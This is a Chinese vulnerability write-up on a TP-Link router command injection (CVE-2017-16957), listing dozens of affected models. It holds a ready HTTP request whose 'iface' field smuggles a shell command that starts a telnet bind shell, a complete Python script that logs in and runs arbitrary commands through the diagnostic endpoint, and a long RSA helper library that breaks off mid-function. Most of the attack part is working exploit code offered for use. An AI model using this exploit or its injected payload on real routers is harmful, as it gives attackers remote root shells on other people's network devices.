<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2017-16957）TP-Link 命令注入漏洞</h1><h2>一、漏洞简介</h2><p>TP-Link TL-WVR等都是中国普联（TP-LINK）公司的无线路由器产品。</p><p>多款TP-Link产品中存在命令注入漏洞。远程攻击者可通过向cgi-bin/luci发送face字段中带有shell元字符的admin/diagnostic命令利用该漏洞执行任意命令。</p><h2>二、漏洞影响</h2><p>TP-LINK TL-WVR TP-LINK TL-WVR300 v4 TP-LINK TL-WVR302 v2 TP-LINK TL-WVR450 TP-LINK TL-WVR450L TP-LINK TL-WVR450G v5 TP-LINK TL-WVR458 TP-LINK TL-WVR458L TP-LINK TL-WVR458P TP-LINK TL-WVR900G v3 TP-LINK TL-WVR1200L TP-LINK TL-WVR900L TP-LINK TL-WVR1300L TP-LINK TL-WVR1300G TP-LINK TL-WVR1750L TP-LINK TL-WVR2600L TP-LINK TL-WVR4300L TP-LINK TL-WAR450 TP-LINK TL-WAR302 TP-LINK TL-WAR2600L TP-LINK TL-WAR1750L TP-LINK TL-WAR1300L TP-LINK TL-WAR1200L TP-LINK TL-WAR900L TP-LINK TL-WAR458 TP-LINK TL-WAR450L TP-LINK TL-ER5510G v2 TP-LINK TL-ER5510G v3 TP-LINK TL-ER5520G v2 TP-LINK TL-ER5520G v3 TP-LINK TL-ER6120G v2 TP-LINK TL-ER6520G v2 TP-LINK TL-ER6520G v3 TP-LINK TL-ER3210G TP-LINK TL-ER7520G TP-LINK TL-ER6520G TP-LINK TL-ER6510G TP-LINK TL-ER6220G TP-LINK TL-ER6120G TP-LINK TL-ER6110G TP-LINK TL-ER5120G TP-LINK TL-ER5110G TP-LINK TL-ER3220G TP-LINK TL-R479P-AC TP-LINK TL-R478G+ TP-LINK TL-R478G TP-LINK TL-R478+ TP-LINK TL-R478 TP-LINK TL-R473GP-AC TP-LINK TL-R473P-AC TP-LINK TL-R473G TP-LINK TL-R473 TP-LINK TL-R4299G TP-LINK TL-R4239G TP-LINK TL-R4149G TP-LINK TL-R488 TP-LINK TL-R483 TP-LINK TL-R483G TP-LINK TL-R479GP-AC TP-LINK TL-R479GPE-AC</p><h2>三、复现过程</h2><p>POST /cgi-bin/luci/;stok=ea2178b4514da7ae227f4ec192536930/admin/diagnostic?form=diag HTTP/1.1<br />Host: 0-sec.org<br />Content-Length: 370<br />Accept: application/json, text/javascript, */*; q=0.01<br />Origin: http://192.168.3.1<br />X-Requested-With: XMLHttpRequest<br />User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36<br />Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br />Referer: http://192.168.3.1/webpages/index.html<br />Accept-Encoding: gzip, deflate<br />Cookie: sysauth=be9b6f2b4b9a76a8a658e108c6197f2c<br />Connection: close<br /><br />data=%7B%22method%22%3A%22start%22%2C%22params%22%3A%7B%22type%22%3A%220%22%2C%22type_hidden%22%3A%220%22%2C%22ipaddr_ping%22%3A%22baidu.com%22%2C%22iface_ping%22%3A%22WAN1%22%2C%22ipaddr%22%3A%22baidu.com%22%2C%22iface%22%3A%22%3Btelnetd+-p+24+-l+/bin/sh%22%2C%22count%22%3A%221%22%2C%22pktsize%22%3A%2264%22%2C%22my_result%22%3A%22The+Router+is+ready.%5Cr%5Cn%22%7D%7D</p><h3>漏洞脚本</h3><p># Tested product: TL-WVR450L<br /># Hardware version：V1.0<br /># Firmware version: 20161125<br /># The RSA_Encryption_For_Tplink.js is use for Rsa Encryption to the password when login the web manager.<br /># You can download the RSA_Encryption_For_Tplink.js by https://github.com/coincoin7/Wireless-Router-Vulnerability/blob/master/RSA_Encryption_For_Tplink.js<br /><br />import execjs<br />import requests<br />import json<br />import urllib<br /><br /><br />def read_js():<br />    file = open(&quot;./RSA_Encryption_For_Tplink.js&quot;, 'r')<br />    line = file.readline()<br />    js = ''<br />    while line:<br />        js = js + line<br />        line = file.readline()<br />    file.close()<br />    return js<br /><br /><br />def execute(ip, port, username, passwd, cmd):<br /><br />    try:<br />        s = requests.session()<br /><br /><br />        uri = "http://{}:{}".format(ip,port)<br />        headers = {<br />            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',<br />            'Referer': 'http://{}/webpages/login.html'.format(ip)<br />            }<br />        payload = {<br />            "method":"get"<br />        }<br />        ret = s.post(uri + '/cgi-bin/luci/;stok=/login?form=login', data=urllib.urlencode({&quot;data&quot;:json.dumps(payload)}), headers=headers, timeout=5)<br />        rsa_public_n = json.loads(ret.text)['result']['password'][0].encode(&quot;utf-8&quot;)<br />        rsa_public_e = json.loads(ret.text)['result']['password'][1].encode(&quot;utf-8&quot;)<br />        js = read_js()<br />        js_handle = execjs.compile(js)<br />        password = js_handle.call('MainEncrypt', rsa_public_n, rsa_public_e, passwd)<br /><br /><br />        payload = {<br />            "method":"login",<br />            "params":{<br />                "username":"{}".format(username),<br />                "password":"{}".format(password)<br />            }<br />        }<br />        ret = s.post(uri + '/cgi-bin/luci/;stok=/login?form=login', data=urllib.urlencode({&quot;data&quot;:json.dumps(payload)}), headers=headers, timeout=5)<br />        stok = json.loads(ret.text)['result']['stok'].encode('utf-8')<br />        cookie = ret.headers['Set-Cookie']<br /><br /><br />        print '[+] Login success'<br />        print '[+] Get The Token: ' + stok<br />        print '[+] Get The Cookie: ' + cookie<br /><br /><br />        headers = {<br />            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',<br />            'Referer':'http://{}/webpages/login.html'.format(ip),<br />            'Cookie':'{}'.format(cookie)<br />            }<br />        payload = {<br />            "method":"start",<br />            "params":{<br />                "type":"0",<br />                "type_hidden":"0",<br />                "ipaddr_ping":"127.0.0.1",<br />                "iface_ping":"WAN1",<br />                "ipaddr":"127.0.0.1",<br />                "iface":";{}".format(cmd),<br />                "count":"1",<br />                "pktsize":"64",<br />                "my_result":"exploit"<br />            }<br />        }<br />        ret = s.post(uri + '/cgi-bin/luci/;stok={}/admin/diagnostic?form=diag'.format(stok), data=urllib.urlencode({&quot;data&quot;:json.dumps(payload)}), headers=headers, timeout=5)<br /><br /><br />        #print ret.text<br />        print '[+] Finish RCE'<br />        print '--------------------------------------------------------------'<br />        return True<br /><br />    except:<br />        return False<br /><br /><br />if __name__=='__main__':<br />    print '-----------Tplink LUCI diagnostic Authenticated RCE-----------'<br />    print execute('192.168.1.1', 80, 'admin', 'admin', 'telnetd -p 24 -l /bin/sh')</p><h3>RSA_Encryption_For_Tplink.js 文件</h3><p>// Copyright (c) 2005  Tom Wu<br />// All Rights Reserved.<br />// See "LICENSE" for details.<br /><br />// Basic JavaScript BN library - subset useful for RSA encryption.<br /><br />// Bits per digit<br /><br />// JavaScript engine analysis<br /><br /><br />var BI_RC = new Array();<br />var BI_RM = "0123456789abcdefghijklmnopqrstuvwxyz";<br />var dbits;<br />var canary = 0xdeadbeefcafe;<br />var j_lm = ((canary&amp;0xffffff)==0xefcafe);<br />var rng_psize = 256;<br />var rng_state;<br />var rng_pool;<br />var rng_pptr;<br />// Initialize the pool with junk if needed.<br />BigInteger.prototype.am = am2;<br />dbits = 30;<br />BigInteger.prototype.DB = dbits;<br />BigInteger.prototype.DM = ((1&lt;&lt;dbits)-1);<br />BigInteger.prototype.DV = (1&lt;&lt;dbits);<br />var BI_FP = 52;<br />BigInteger.prototype.FV = Math.pow(2,BI_FP);<br />BigInteger.prototype.F1 = BI_FP-dbits;<br />BigInteger.prototype.F2 = 2*dbits-BI_FP;<br />// protected<br />BigInteger.prototype.copyTo = bnpCopyTo;<br />BigInteger.prototype.fromInt = bnpFromInt;<br />BigInteger.prototype.fromString = bnpFromString;<br />BigInteger.prototype.clamp = bnpClamp;<br />BigInteger.prototype.dlShiftTo = bnpDLShiftTo;<br />BigInteger.prototype.drShiftTo = bnpDRShiftTo;<br />BigInteger.prototype.lShiftTo = bnpLShiftTo;<br />BigInteger.prototype.rShiftTo = bnpRShiftTo;<br />BigInteger.prototype.subTo = bnpSubTo;<br />BigInteger.prototype.multiplyTo = bnpMultiplyTo;<br />BigInteger.prototype.squareTo = bnpSquareTo;<br />BigInteger.prototype.divRemTo = bnpDivRemTo;<br />BigInteger.prototype.invDigit = bnpInvDigit;<br />BigInteger.prototype.isEven = bnpIsEven;<br />BigInteger.prototype.exp = bnpExp;<br />// public<br />BigInteger.prototype.toString = bnToString;<br />BigInteger.prototype.negate = bnNegate;<br />BigInteger.prototype.abs = bnAbs;<br />BigInteger.prototype.compareTo = bnCompareTo;<br />BigInteger.prototype.bitLength = bnBitLength;<br />BigInteger.prototype.mod = bnMod;<br />BigInteger.prototype.modPowInt = bnModPowInt;<br />// "constants"<br />BigInteger.ZERO = nbv(0);<br />BigInteger.ONE = nbv(1);<br />// Digit conversions<br />var rr,vv;<br />rr = "0".charCodeAt(0);<br />for(vv = 0; vv &lt;= 9; ++vv) BI_RC[rr++] = vv;<br />rr = "a".charCodeAt(0);<br />for(vv = 10; vv &lt; 36; ++vv) BI_RC[rr++] = vv;<br />rr = "A".charCodeAt(0);<br />for(vv = 10; vv &lt; 36; ++vv) BI_RC[rr++] = vv;<br /><br />Classic.prototype.convert = cConvert;<br />Classic.prototype.revert = cRevert;<br />Classic.prototype.reduce = cReduce;<br />Classic.prototype.mulTo = cMulTo;<br />Classic.prototype.sqrTo = cSqrTo;    <br /><br />Arcfour.prototype.init = ARC4init;<br />Arcfour.prototype.next = ARC4next;<br /><br />SecureRandom.prototype.nextBytes = rng_get_bytes;<br /><br />Montgomery.prototype.convert = montConvert;<br />Montgomery.prototype.revert = montRevert;<br />Montgomery.prototype.reduce = montReduce;<br />Montgomery.prototype.mulTo = montMulTo;<br />Montgomery.prototype.sqrTo = montSqrTo;<br />Arcfour.prototype.init = ARC4init;<br />Arcfour.prototype.next = ARC4next;<br /><br /><br />// (public) Constructor<br />function BigInteger(a,b,c) {<br />  if(a != null)<br />    if("number" == typeof a) this.fromNumber(a,b,c);<br />    else if(b == null &amp;&amp; "string" != typeof a) this.fromString(a,256);<br />    else this.fromString(a,b);<br />}<br /><br />// return new, unset BigInteger<br />function nbi() { return new BigInteger(null); }<br /><br />// am: Compute w_j += (x*this_i), propagate carries,<br />// c is initial carry, returns final carry.<br />// c &lt; 3*dvalue, x &lt; 2*dvalue, this_i &lt; dvalue<br />// We need to select the fastest one that works in this environment.<br /><br />// am1: use a single mult and divide to get the high bits,<br />// max digit bits should be 26 because<br />// max internal value = 2*dvalue^2-2*dvalue (&lt; 2^53)<br />function am1(i,x,w,j,c,n) {<br />  while(--n &gt;= 0) {<br />    var v = x*this[i++]+w[j]+c;<br />    c = Math.floor(v/0x4000000);<br />    w[j++] = v&amp;0x3ffffff;<br />  }<br />  return c;<br />}<br />// am2 avoids a big mult-and-extract completely.<br />// Max digit bits should be &lt;= 30 because we do bitwise ops<br />// on values up to 2*hdvalue^2-hdvalue-1 (&lt; 2^31)<br />function am2(i,x,w,j,c,n) {<br />  var xl = x&amp;0x7fff, xh = x&gt;&gt;15;<br />  while(--n &gt;= 0) {<br />    var l = this[i]&amp;0x7fff;<br />    var h = this[i++]&gt;&gt;15;<br />    var m = xh*l+h*xl;<br />    l = xl*l+((m&amp;0x7fff)&lt;&lt;15)+w[j]+(c&amp;0x3fffffff);<br />    c = (l&gt;&gt;&gt;30)+(m&gt;&gt;&gt;15)+xh*h+(c&gt;&gt;&gt;30);<br />    w[j++] = l&amp;0x3fffffff;<br />  }<br />  return c;<br />}<br />// Alternately, set max digit bits to 28 since some<br />// browsers slow down when dealing with 32-bit numbers.<br />function am3(i,x,w,j,c,n) {<br />  var xl = x&amp;0x3fff, xh = x&gt;&gt;14;<br />  while(--n &gt;= 0) {<br />    var l = this[i]&amp;0x3fff;<br />    var h = this[i++]&gt;&gt;14;<br />    var m = xh*l+h*xl;<br />    l = xl*l+((m&amp;0x3fff)&lt;&lt;14)+w[j]+c;<br />    c = (l&gt;&gt;28)+(m&gt;&gt;14)+xh*h;<br />    w[j++] = l&amp;0xfffffff;<br />  }<br />  return c;<br />}<br /><br />function int2char(n) { return BI_RM.charAt(n); }<br />function intAt(s,i) {<br />  var c = BI_RC[s.charCodeAt(i)];<br />  return (c==null)?-1:c;<br />}<br /><br />// (protected) copy this to r<br />function bnpCopyTo(r) {<br />  for(var i = this.t-1; i &gt;= 0; --i) r[i] = this[i];<br />  r.t = this.t;<br />  r.s = this.s;<br />}<br /><br />// (protected) set from integer value x, -DV &lt;= x &lt; DV<br />function bnpFromInt(x) {<br />  this.t = 1;<br />  this.s = (x&lt;0)?-1:0;<br />  if(x &gt; 0) this[0] = x;<br />  else if(x &lt; -1) this[0] = x+this.DV;<br />  else this.t = 0;<br />}<br /><br />// return bigint initialized to value<br />function nbv(i) { var r = nbi(); r.fromInt(i); return r; }<br /><br />// (protected) set from string and radix<br />function bnpFromString(s,b) {<br />  var k;<br />  if(b == 16) k = 4;<br />  else if(b == 8) k = 3;<br />  else if(b == 256) k = 8; // byte array<br />  else if(b == 2) k = 1;<br />  else if(b == 32) k = 5;<br />  else if(b == 4) k = 2;<br />  else { this.fromRadix(s,b); return; }<br />  this.t = 0;<br />  this.s = 0;<br />  var i = s.length, mi = false, sh = 0;<br />  while(--i &gt;= 0) {<br />    var x = (k==8)?s[i]&amp;0xff:intAt(s,i);<br />    if(x &lt; 0) {<br />      if(s.charAt(i) == "-") mi = true;<br />      continue;<br />    }<br />    mi = false;<br />    if(sh == 0)<br />      this[this.t++] = x;<br />    else if(sh+k &gt; this.DB) {<br />      this[this.t-1] |= (x&amp;((1&lt;&lt;(this.DB-sh))-1))&lt;&lt;sh;<br />      this[this.t++] = (x&gt;&gt;(this.DB-sh));<br />    }<br />    else<br />      this[this.t-1] |= x&lt;&lt;sh;<br />    sh += k;<br />    if(sh &gt;= this.DB) sh -= this.DB;<br />  }<br />  if(k == 8 &amp;&amp; (s[0]&amp;0x80) != 0) {<br />    this.s = -1;<br />    if(sh &gt; 0) this[this.t-1] |= ((1&lt;&lt;(this.DB-sh))-1)&lt;&lt;sh;<br />  }<br />  this.clamp();<br />  if(mi) BigInteger.ZERO.subTo(this,this);<br />}<br /><br />// (protected) clamp off excess high words<br />function bnpClamp() {<br />  var c = this.s&amp;this.DM;<br />  while(this.t &gt; 0 &amp;&amp; this[this.t-1] == c) --this.t;<br />}<br /><br />// (public) return string representation in given radix<br />function bnToString(b) {<br />  if(this.s &lt; 0) return "-"+this.negate().toString(b);<br />  var k;<br />  if(b == 16) k = 4;<br />  else if(b == 8) k = 3;<br />  else if(b == 2) k = 1;<br />  else if(b == 32) k = 5;<br />  else if(b == 4) k = 2;<br />  else return this.toRadix(b);<br />  var km = (1&lt;&lt;k)-1, d, m = false, r = "", i = this.t;<br />  var p = this.DB-(i*this.DB)%k;<br />  if(i-- &gt; 0) {<br />    if(p &lt; this.DB &amp;&amp; (d = this[i]&gt;&gt;p) &gt; 0) { m = true; r = int2char(d); }<br />    while(i &gt;= 0) {<br />      if(p &lt; k) {<br />        d = (this[i]&amp;((1&lt;&lt;p)-1))&lt;&lt;(k-p);<br />        d |= this[--i]&gt;&gt;(p+=this.DB-k);<br />      }<br />      else {<br />        d = (this[i]&gt;&gt;(p-=k))&amp;km;<br />        if(p &lt;= 0) { p += this.DB; --i; }<br />      }<br />      if(d &gt; 0) m = true;<br />      if(m) r += int2char(d);<br />    }<br />  }<br />  return m?r:"0";<br />}<br /><br />// (public) -this<br />function bnNegate() { var r = nbi(); BigInteger.ZERO.subTo(this,r); return r; }<br /><br />// (public) |this|<br />function bnAbs() { return (this.s&lt;0)?this.negate():this; }<br /><br />// (public) return + if this &gt; a, - if this &lt; a, 0 if equal<br />function bnCompareTo(a) {<br />  var r = this.s-a.s;<br />  if(r != 0) return r;<br />  var i = this.t;<br />  r = i-a.t;<br />  if(r != 0) return (this.s&lt;0)?-r:r;<br />  while(--i &gt;= 0) if((r=this[i]-a[i]) != 0) return r;<br />  return 0;<br />}<br /><br />// returns bit length of the integer x<br />function nbits(x) {<br />  var r = 1, t;<br />  if((t=x&gt;&gt;&gt;16) != 0) { x = t; r += 16; }<br />  if((t=x&gt;&gt;8) != 0) { x = t; r += 8; }<br />  if((t=x&gt;&gt;4) != 0) { x = t; r += 4; }<br />  if((t=x&gt;&gt;2) != 0) { x = t; r += 2; }<br />  if((t=x&gt;&gt;1) != 0) { x = t; r += 1; }<br />  return r;<br />}<br /><br />// (public) return the number of bits in "this"<br />function bnBitLength() {<br />  if(this.t &lt;= 0) return 0;<br />  return this.DB*(this.t-1)+nbits(this[this.t-1]^(this.s&amp;this.DM));<br />}<br /><br />// (protected) r = this &lt;&lt; n*DB<br />function bnpDLShiftTo(n,r) {<br />  var i;<br />  for(i = this.t-1; i &gt;= 0; --i) r[i+n] = this[i];<br />  for(i = n-1; i &gt;= 0; --i) r[i] = 0;<br />  r.t = this.t+n;<br />  r.s = this.s;<br />}<br /><br />// (protected) r = this &gt;&gt; n*DB<br />function bnpDRShiftTo(n,r) {<br />  for(var i = n; i &lt; this.t; ++i) r[i-n] = this[i];<br />  r.t = Math.max(this.t-n,0);<br />  r.s = this.s;<br />}<br /><br />// (protected) r = this &lt;&lt; n<br />function bnpLShiftTo(n,r) {<br />  var bs = n%this.DB;<br />  var cbs = this.DB-bs;<br />  var bm = (1&lt;&lt;cbs)-1;<br />  var ds = Math.floor(n/this.DB), c = (this.s&lt;&lt;bs)&amp;this.DM, i;<br />  for(i = this.t-1; i &gt;= 0; --i) {<br />    r[i+ds+1] = (this[i]&gt;&gt;cbs)|c;<br />    c = (this[i]&amp;bm)&lt;&lt;bs;<br />  }<br />  for(i = ds-1; i &gt;= 0; --i) r[i] = 0;<br />  r[ds] = c;<br />  r.t = this.t+ds+1;<br />  r.s = this.s;<br />  r.clamp();<br />}<br /><br />// (protected) r = this &gt;&gt; n<br />function bnpRShiftTo(n,r) {<br />  r.s = this.s;<br />  var ds = Math.floor(n/this.DB);<br />  if(ds &gt;= this.t) { r.t = 0; return; }<br />  var bs = n%this.DB;<br />  var cbs = this.DB-bs;<br />  var bm = (1&lt;&lt;bs)-1;<br />  r[0] = this[ds]&gt;&gt;bs;<br />  for(var i = ds+1; i &lt; this.t; ++i) {<br />    r[i-ds-1] |= (this[i]&amp;bm)&lt;&lt;cbs;<br />    r[i-ds] = this[i]&gt;&gt;bs;<br />  }<br />  if(bs &gt; 0) r[this.t-ds-1] |= (this.s&amp;bm)&lt;&lt;cbs;<br />  r.t = this.t-ds;<br />  r.clamp();<br />}<br /><br />// (protected) r = this - a<br />function bnpSubTo(a,r) {<br />  var i = 0, c = 0, m = Math.min(a.t,this.t);<br />  while(i &lt; m) {<br />    c += this[i]-a[i];<br />    r[i++] = c&amp;this.DM;<br />    c &gt;&gt;= this.DB;<br />  }<br />  if(a.t &lt; this.t) {<br />    c -= a.s;<br />    while(i &lt; this.t) {<br />      c += this[i];<br />      r[i++] = c&amp;this.DM;<br />      c &gt;&gt;= this.DB;<br />    }<br />    c += this.s;<br />  }<br />  else {<br />    c += this.s;<br />    while(i &lt; a.t) {<br />      c -= a[i];<br />      r[i++] = c&amp;this.DM;<br />      c &gt;&gt;= this.DB;<br />    }<br />    c -= a.s;<br />  }<br />  r.s = (c&lt;0)?-1:0;<br />  if(c &lt; -1) r[i++] = this.DV+c;<br />  else if(c &gt; 0) r[i++] = c;<br />  r.t = i;<br />  r.clamp();<br />}<br /><br />// (protected) r = this * a, r != this,a (HAC 14.12)<br />// "this" should be the larger one if appropriate.<br />function bnpMultiplyTo(a,r) {<br />  var x = this.abs(), y = a.abs();<br />  var i = x.t;<br />  r.t = i+y.t;<br />  while(--i &gt;= 0) r[i] = 0;<br />  for(i = 0; i &lt; y.t; ++i) r[i+x.t] = x.am(0,y[i],r,i,0,x.t);<br />  r.s = 0;<br />  r.clamp();<br />  if(this.s != a.s) BigInteger.ZERO.subTo(r,r);<br />}<br /><br />// (protected) r = this^2, r != this (HAC 14.16)<br />function bnpSquareTo(r) {<br />  var x = this.abs();<br />  var i = r.t = 2*x.t;<br />  while(--i &gt;= 0) r[i] = 0;<br />  for(i = 0; i &lt; x.t-1; ++i) {<br />    var c = x.am(i,x[i],r,2*i,0,1);<br />    if((r[i+x.t]+=x.am(i+1,2*x[i],r,2*i+1,c,x.t-i-1)) &gt;= x.DV) {<br />      r[i+x.t] -= x.DV;<br />      r[i+x.t+1] = 1;<br />    }<br />  }<br />  if(r.t &gt; 0) r[r.t-1] += x.am(i,x[i],r,2*i,0,1);<br />  r.s = 0;<br />  r.clamp();<br />}<br /><br />// (protected) divide this by m, quotient and remainder to q, r (HAC 14.20)<br />// r != q, this != m.  q or r may be null.<br />function bnpDivRemTo(m,q,r) {<br />  var pm = m.abs();<br />  if(pm.t &lt;= 0) return;<br />  var pt = this.abs();<br />  if(pt.t &lt; pm.t) {<br />    if(q != null) q.fromInt(0);<br />    if(r != null) this.copyTo(r);<br />    return;<br />  }<br />  if(r == null) r = nbi();<br />  var y = nbi(), ts = this.s, ms = m.s;<br />  var nsh = this.DB-nbits(pm[pm.t-1]);    // normalize modulus<br />  if(nsh &gt; 0) { pm.lShiftTo(nsh,y); pt.lShiftTo(nsh,r); }<br />  else { pm.copyTo(y); pt.copyTo(r); }<br />  var ys = y.t;<br />  var y0 = y[ys-1];<br />  if(y0 == 0) return;<br />  var yt = y0*(1&lt;&lt;this.F1)+((ys&gt;1)?y[ys-2]&gt;&gt;this.F2:0);<br />  var d1 = this.FV/yt, d2 = (1&lt;&lt;this.F1)/yt, e = 1&lt;&lt;this.F2;<br />  var i = r.t, j = i-ys, t = (q==null)?nbi():q;<br />  y.dlShiftTo(j,t);<br />  if(r.compareTo(t) &gt;= 0) {<br />    r[r.t++] = 1;<br />    r.subTo(t,r);<br />  }<br />  BigInteger.ONE.dlShiftTo(ys,t);<br />  t.subTo(y,y);    // "negative" y so we can replace sub with am later<br />  while(y.t &lt; ys) y[y.t++] = 0;<br />  while(--j &gt;= 0) {<br />    // Estimate quotient digit<br />    var qd = (r[--i]==y0)?this.DM:Math.floor(r[i]*d1+(r[i-1]+e)*d2);<br />    if((r[i]+=y.am(0,qd,r,j,0,ys)) &lt; qd) {    // Try it out<br />      y.dlShiftTo(j,t);<br />      r.subTo(t,r);<br />      while(r[i] &lt; --qd) r.subTo(t,r);<br />    }<br />  }<br />  if(q != null) {<br />    r.drShiftTo(ys,q);<br />    if(ts != ms) BigInteger.ZERO.subTo(q,q);<br />  }<br />  r.t = ys;<br />  r.clamp();<br />  if(nsh &gt; 0) r.rShiftTo(nsh,r);    // Denormalize remainder<br />  if(ts &lt; 0) BigInteger.ZERO.subTo(r,r);<br />}<br /><br />// (public) this mod a<br />function bnMod(a) {<br />  var r = nbi();<br />  this.abs().divRemTo(a,null,r);<br />  if(this.s &lt; 0 &amp;&amp; r.compareTo(BigInteger.ZERO) &gt; 0) a.subTo(r,r);<br />  return r;<br />}<br /><br />// Modular reduction using "classic" algorithm<br />function Classic(m) { this.m = m; }<br />function cConvert(x) {<br />  if(x.s &lt; 0 || x.compareTo(this.m) &gt;= 0) return x.mod(this.m);<br />  else return x;<br />}<br />function cRevert(x) { return x; }<br />function cReduce(x) { x.divRemTo(this.m,null,x); }<br />function cMulTo(x,y,r) { x.multiplyTo(y,r); this.reduce(r); }<br />function cSqrTo(x,r) { x.squareTo(r); this.reduce(r); }<br /><br />// (protected) return "-1/this % 2^DB"; useful for Mont. reduction<br />// justification:<br />//         xy == 1 (mod m)<br />//         xy =  1+km<br />//   xy(2-xy) = (1+km)(1-km)<br />// x[y(2-xy)] = 1-k^2m^2<br />// x[y(2-xy)] == 1 (mod m^2)<br />// if y is 1/x mod m, then y(2-xy) is 1/x mod m^2<br />// should reduce x and y(2-xy) by m^2 at each step to keep size bounded.<br />// JS multiply "overflows" differently from C/C++, so care is needed here.<br />function bnpInvDigit() {<br />  if(this.t &lt; 1) return 0;<br />  var x = this[0];<br />  if((x&amp;1) == 0) return 0;<br />  var y = x&amp;3;        // y == 1/x mod 2^2<br />  y = (y*(2-(x&amp;0xf)*y))&amp;0xf;    // y == 1/x mod 2^4<br />  y = (y*(2-(x&amp;0xff)*y))&amp;0xff;    // y == 1/x mod 2^8<br />  y = (y*(2-(((x&amp;0xffff)*y)&amp;0xffff)))&amp;0xffff;    // y == 1/x mod 2^16<br />  // last step - calculate inverse mod DV directly;<br />  // assumes 16 &lt; DB &lt;= 32 and assumes ability to handle 48-bit ints<br />  y = (y*(2-x*y%this.DV))%this.DV;        // y == 1/x mod 2^dbits<br />  // we really want the negative inverse, and -DV &lt; y &lt; DV<br />  return (y&gt;0)?this.DV-y:-y;<br />}<br /><br />// Montgomery reduction<br />function Montgomery(m) {<br />  this.m = m;<br />  this.mp = m.invDigit();<br />  this.mpl = this.mp&amp;0x7fff;<br />  this.mph = this.mp&gt;&gt;15;<br />  this.um = (1&lt;&lt;(m.DB-15))-1;<br />  this.mt2 = 2*m.t;<br />}<br /><br />// xR mod m<br />function montConvert(x) {<br />  var r = nbi();<br />  x.abs().dlShiftTo(this.m.t,r);<br />  r.divRemTo(this.m,null,r);<br />  if(x.s &lt; 0 &amp;&amp; r.compareTo(BigInteger.ZERO) &gt; 0) this.m.subTo(r,r);<br />  return r;<br />}<br /><br />// x/R mod m<br />function montRevert(x) {<br />  var r = nbi();<br />  x.copyTo(r);<br />  this.reduce(r);<br />  return r;<br />}<br /><br />// x = x/R mod m (HAC 14.32)<br />function montReduce(x) {<br />  while(x.t &lt;= this.mt2)    // pad x so am has enough room later<br />    x[x.t++] = 0;<br />  for(var i = 0; i &lt; this.m.t; ++i) {<br />    // faster way of calculating u0 = x[i]*mp mod DV<br />    var j = x[i]&amp;0x7fff;<br />    var u0 = (j*this.mpl+(((j*this.mph+(x[i]&gt;&gt;15)*this.mpl)&amp;this.um)&lt;&lt;15))&amp;x.DM;<br />    // use am to combine the multiply-shift-add into one call<br />    j = i+this.m.t;<br />    x[j] += this.m.am(0,u0,x,i,0,this.m.t);<br />    // propagate carry<br />    while(x[j] &gt;= x.DV) { x[j] -= x.DV; x[++j]++; }<br />  }<br />  x.clamp();<br />  x.drShiftTo(this.m.t,x);<br />  if(x.compareTo(this.m) &gt;= 0) x.subTo(this.m,x);<br />}<br /><br />// r = "x^2/R mod m"; x != r<br />function montSqrTo(x,r) { x.squareTo(r); this.reduce(r); }<br /><br />// r = "xy/R mod m"; x,y != r<br />function montMulTo(x,y,r) { x.multiplyTo(y,r); this.reduce(r); }<br /><br />// (protected) true iff this is even<br />function bnpIsEven() { return ((this.t&gt;0)?(this[0]&amp;1):this.s) == 0; }<br /><br />// (protected) this^e, e &lt; 2^32, doing sqr and mul with "r" (HAC 14.79)<br />function bnpExp(e,z) {<br />  if(e &gt; 0xffffffff || e &lt; 1) return BigInteger.ONE;<br />  var r = nbi(), r2 = nbi(), g = z.convert(this), i = nbits(e)-1;<br />  g.copyTo(r);<br />  while(--i &gt;= 0) {<br />    z.sqrTo(r,r2);<br />    if((e&amp;(1&lt;&lt;i)) &gt; 0) z.mulTo(r2,g,r);<br />    else { var t = r; r = r2; r2 = t; }<br />  }<br />  return z.revert(r);<br />}<br /><br />// (public) this^e % m, 0 &lt;= e &lt; 2^32<br />function bnModPowInt(e,m) {<br />  var z;<br />  if(e &lt; 256 || m.isEven()) z = new Classic(m); else z = new Montgomery(m);<br />  return this.exp(e,z);<br />}<br /><br />// prng4.js - uses Arcfour as a PRNG<br /><br />function Arcfour() {<br />  this.i = 0;<br />  this.j = 0;<br />  this.S = new Array();<br />}<br /><br />// Initialize arcfour context from key, an array of ints, each from [0..255]<br />function ARC4init(key) {<br />  var i, j, t;<br />  for(i = 0; i &lt; 256; ++i)<br />    this.S[i] = i;<br />  j = 0;<br />  for(i = 0; i &lt; 256; ++i) {<br />    j = (j + this.S[i] + key[i % key.length]) &amp; 255;<br />    t = this.S[i];<br />    this.S[i] = this.S[j];<br />    this.S[j] = t;<br />  }<br />  this.i = 0;<br />  this.j = 0;<br />}<br /><br />function ARC4next() {<br />  var t;<br />  this.i = (this.i + 1) &amp; 255;<br />  this.j = (this.j + this.S[this.i]) &amp; 255;<br />  t = this.S[this.i];<br />  this.S[this.i] = this.S[this.j];<br />  this.S[this.j] = t;<br />  return this.S[(t + this.S[this.i]) &amp; 255];<br />}<br /><br />// Plug in your RNG constructor here<br />function prng_newstate() {<br />  return new Arcfour();<br />}<br /><br />// Mix in a 32-bit integer into the pool<br />function rng_seed_int(x) {<br />  rng_pool[rng_pptr++] ^= x &amp; 255;<br />  